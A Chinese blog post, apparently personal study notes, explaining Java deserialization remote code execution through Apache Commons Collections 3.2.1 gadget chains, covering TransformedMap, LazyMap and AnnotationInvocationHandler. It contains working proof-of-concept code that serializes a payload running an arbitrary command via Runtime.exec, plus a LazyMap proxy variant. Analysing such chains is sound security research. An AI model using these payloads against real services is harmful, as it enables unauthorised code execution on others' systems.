---
title: JAVA反序列化漏洞知识点整理
date: 2017-05-07 11:07:41
categories: Web安全
tags:
    - 反序列化
    - JAVA
---

jenkins反序列漏洞跟过一遍之后，虽说梳理清楚了漏洞触发的大体流程，但是对于JAVA反序列化漏洞导致代码执行的原理仍旧不懂，因此有必要整理JAVA反序列化漏洞相关的知识点。

<!-- more -->

## JAVA反序列化漏洞

反序列化漏洞的本质是反序列化机制打破了数据和对象的边界，导致攻击者注入的恶意序列化数据在反序列化过程中被还原成对象，控制了对象就可能在目标系统上面执行攻击代码，而不可信的输入和未检测反序列化对象的安全性是导致反序列化漏洞的常见原因。Java序列化常应用于RMI(Java Remote Method Invocatio, 远程方法调用)， JMX(Java Management Extensions, Java管理扩展), JMS(Java Message Service, Java消息服务) 技术中。

## 利用Apache Commons Collections实现远程代码执行

Apache Commons Collections作为一种公用库，其中实现的一些类可以被反序列化用来实现任意代码执行。这里以以Apache Commons Collections 3.2.1为例，解释如何构造对象，能够让程序在反序列化，即调用readObject()时，就能直接实现任意代码执行。

### 利用反射机制执行任意代码

国外研究人员发现`InvokerTransformer`类中的`transform()`方法允许通过反射, 执行参数对象的某个方法，并返回执行结果。

```java
public class InvokerTransformer implements Transformer, Serializable {
    private static final long serialVersionUID = -8653385846894047688L;
    private final String iMethodName;
    private final Class[] iParamTypes;
    private final Object[] iArgs;

    private InvokerTransformer(String methodName) {
        this.iMethodName = methodName;
        this.iParamTypes = null;
        this.iArgs = null;
    }

    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        this.iMethodName = methodName;
        this.iParamTypes = paramTypes;
        this.iArgs = args;
    }

    public Object transform(Object input) {
        if(input == null) {
            return null;
        } else {
            try {
                Class cls = input.getClass();
                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
                return method.invoke(input, this.iArgs);
            }
```

{% asset_img 001.png %}
{% asset_img 002.png %}

可以看到，通过`transform()`方法里的反射，成功调用了`StringBuffer`类的`append()`方法并返回结果。

### 调用transform()方法

接下来就是要找到某种类，会自动调用`InvokerTransformer`类中的`transform()`方法，构造代码执行。明显调用`transform()`方法有以下两个类:

* TransformedMap
* LazyMap

#### TransformedMap

Apache Commons Collections中实现`TransformedMap`类，用来对`Map`进行某种变换，只要调用其`decorate()`方法，传入key和value的变换对象`Transformer`，即可从任意`Map`对象生成相应的`TransformedMap`，`decorate()`方法如下：

```java
public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
    return new TransformedMap(map, keyTransformer, valueTransformer);
}
```

`Transformer`是一个接口，其中定义的`transform()`方法用来将一个对象转换成另一个对象。如下所示：

```
public interface Transformer {
    public Object transform(Object input);
}
```

而前面提到的`InvokerTransformer`类实现了`Transformer`接口，因此这里就找到了调用`InvokerTransformer`类`transform()`方法的途径。那么，现在需要知道的是触发`TransformedMap`类调用`Transformer`的条件是什么？

[commons-collections 3.2.2](https://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/org/apache/commons/collections/map/TransformedMap.html)指出当执行`Map`类的`put()`方法或`MapEntry`类的`setValue()`方法会自动调用`Transformer`。另外多个`Transformer`还能串起来，形成`ChainedTransformer`。

{% asset_img 003.png %}

从图中可以看出调用`Map`类的`put()`方法会自动调用`InvokerTransformer`类的`transform()`方法。

#### LazyMap

`LazyMap`实现了`Map`接口，其中的`get(Object)`方法调用了`transform()`方法，跟进函数进去

```java
public Object get(Object key) {
    // create value for key if key is not currently in the map
    if (map.containsKey(key) == false) {
        Object value = factory.transform(key);
        map.put(key, value);
        return value;
    }
    return map.get(key);
}
```

这里可以看到，在调用`transform()`方法之前会先判断当前Map中是否已经有该key，如果没有最终会由这里的`factory.transform()`进行处理，跟踪`facory`变量找到`decorate()`方法。

```java
public static Map decorate(Map map, Transformer factory) {
    return new LazyMap(map, factory);
}
```

这里的`decorate()`方法会对`factory`进行初始化，同时实例化一个`LazyMap`，为了能成功调用`transform()`方法，找到了`LazyMap`，发现在`get()`方法中调用了`transform()`方法，那么现在漏洞利用的核心条件就是去寻找一个类，在对象进行反序列化时会调用我们精心构造对象的`get(Object)`方法。

### 突破限制条件

#### TransformedMap

虽然找到了自动调用`InvokerTransformer`类的`transform()`方法的途径，但是需要满足其触发条件：执行`Map`类的`put()`方法或`MapEntry`类的`setValue()`方法。显然这种方式还不够优雅，最佳条件是反序列化(调用`readObject()`方法)时就自动调用`InvokerTransformer`类的`transform()`方法导致代码执行。

java运行库中的`AnnotationInvocationHandler`类, 有一个成员变量`memberValues`是`Map`类型，而且`readObject()`方法中对`memberValues`的每一项调用了`setValue()`方法。

```java
class AnnotationInvocationHandler implements InvocationHandler, Serializable {
    private final Class<? extends Annotation> type;
    private final Map<String, Object> memberValues;

    AnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues) {
        this.type = type;
        this.memberValues = memberValues;
    }

    private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        s.defaultReadObject();


        // Check to make sure that types have not evolved incompatibly

        AnnotationType annotationType = null;
        try {
            annotationType = AnnotationType.getInstance(type);
        } catch(IllegalArgumentException e) {
            // Class is no longer an annotation type; all bets are off
            return;
        }

        Map<String, Class<?>> memberTypes = annotationType.memberTypes();

        for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
            String name = memberValue.getKey();
            Class<?> memberType = memberTypes.get(name);
            if (memberType != null) {  // i.e. member still exists
                Object value = memberValue.getValue();
                if (!(memberType.isInstance(value) ||
                      value instanceof ExceptionProxy)) {
                    // 此处触发一系列的Transformer
                    memberValue.setValue(
                        new AnnotationTypeMismatchExceptionProxy(
                            value.getClass() + "[" + value + "]").setMember(
                                annotationType.members().get(name)));
```

因此，我们只需要用前面构造的`Map`来构造`AnnotationInvocationHandler`，进行序列化，当触发`readObject()`反序列化的时候，就能实现命令执行。

```java
//
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

/**
 * Created by js on 2017/5/6.
 */
public class Test {
    public static void main(String[] args) throws Exception {
        /*
         * Runtime.getRuntime().exec("open /Applications/Calculator.app");
         */
        String command = (args.length != 0) ? args[0] : "/bin/sh,-c,open /Applications/Calculator.app";
        String[] execArgs = command.split(",");
        Transformer[] transforms = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(
                        "getMethod",
                        new Class[] {String.class, Class[].class},
                        new Object[] {"getRuntime", new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[] {Object.class, Object[].class},
                        new Object[] {null, new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[] {String[].class},
                        new Object[] {execArgs}
                )
        };
        Transformer transformerChain = new ChainedTransformer(transforms);
        Map tempMap = new HashMap();
        // tempMap 不能为空
        tempMap.put("hack", "you");
        Map exMap = TransformedMap.decorate(tempMap, null, transformerChain);
        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
        ctor.setAccessible(true);
        Object instance = ctor.newInstance(Target.class, exMap);

        File f = new File("payload1");
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(f));
        oos.writeObject(instance);
        oos.flush();
        oos.close();

        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(f));
        // 触发代码执行
        Object newObj = ois.readObject();
        ois.close();
    }
}
```

这段恶意代码本质上就是利用反射调用`Runtime()` 执行了一段系统命令，作用等同于:

```java
((Runtime) Runtime.class.getMethod("getRuntime", null).invoke(null, null)).exec("/bin/sh -c open /Applications/Calculator.app")
```

当然，反序列化时自动执行任意代码还有其他方式，具体可以分析ysoserial源码，这里就不一一叙述。采用`AnnotationInvocationHandler`类也是有条件限制的，是否能成功利用与JDK的版本有关, [http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/f8a528d0379d](http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/f8a528d0379d)。

{% asset_img 004.png %}

`AnnotationInvocationHandler`类移除了对`memberValue.setValue()`的调用，因此也就不能用`AnnotationInvocationHandler`+`TransformedMap`来构造POP链了。

#### LazyMap

`AnnotationInvocationHandler`构造函数初始化l`LazyMap`对象, 只需要找到一个`memberValues.get(Object)`的方法即可触发该漏洞，可惜的是`readObject()`方法里面并没有这个方法. 在`invoke()`方法中`memberValues.get(Object)`被调用了，如下:

{% asset_img 005.png %}

`AnnotationInvocationHandler`类实现了`InvocationHandler`接口，所以它可以代理其他对象。这里利用这个特点，代理一个`Map`对象，得到`mapProxy`代理对象。然后，将`mapProxy`赋值到`AnnotationInvocationHandler`类中，当其调用`mapProxy`方法时，便可以触发`invoke()`方法。然后，便可以执行`transform`链。

核心代码如下：

```java
Transformer transformerChain = new ChainedTransformer(transforms);
Map tempMap = new HashMap();
Map lazyMap = LazyMap.decorate(tempMap, transformerChain);

String classToSerialize = "sun.reflect.annotation.AnnotationInvocationHandler";
final Constructor<?> constructor = Class.forName(classToSerialize).getDeclaredConstructors()[0];
constructor.setAccessible(true);

InvocationHandler firstInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);
Proxy evilProxy = (Proxy) Proxy.newProxyInstance(Test.class.getClassLoader(), new Class[] {Map.class}, firstInvocationHandler );

InvocationHandler invocationHandlerToSerialize = (InvocationHandler) constructor.newInstance(Override.class, evilProxy);

File f = new File("expLazyMap.payload");
ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(f));
oos.writeObject(invocationHandlerToSerialize);
oos.flush();
oos.close();
```

## 参考

* [http://www.angelwhu.com/blog/?p=394](http://www.angelwhu.com/blog/?p=394)
* [Lib之过？Java反序列化漏洞通用利用分析](https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/)
* [Commons Collections Java反序列化漏洞深入分析](https://security.tencent.com/index.php/blog/msg/97)
* [https://github.com/frohoff/ysoserial](https://github.com/frohoff/ysoserial)
* [https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet)
* [common-collections中Java反序列化漏洞导致的RCE原理分析](http://wooyun.jozxing.cc/static/drops/papers-10467.html)
* [从反序列化到命令执行 - Java 中的 POP 执行链](http://rickgray.me/2015/11/25/untrusted-deserialization-exploit-with-java.html)
* [http://blog.nsfocus.net/java-deserialization-vulnerability-overlooked-mass-destruction/](http://blog.nsfocus.net/java-deserialization-vulnerability-overlooked-mass-destruction/)
* [http://techshow.ctrip.com/archives/1414.html](http://techshow.ctrip.com/archives/1414.html)
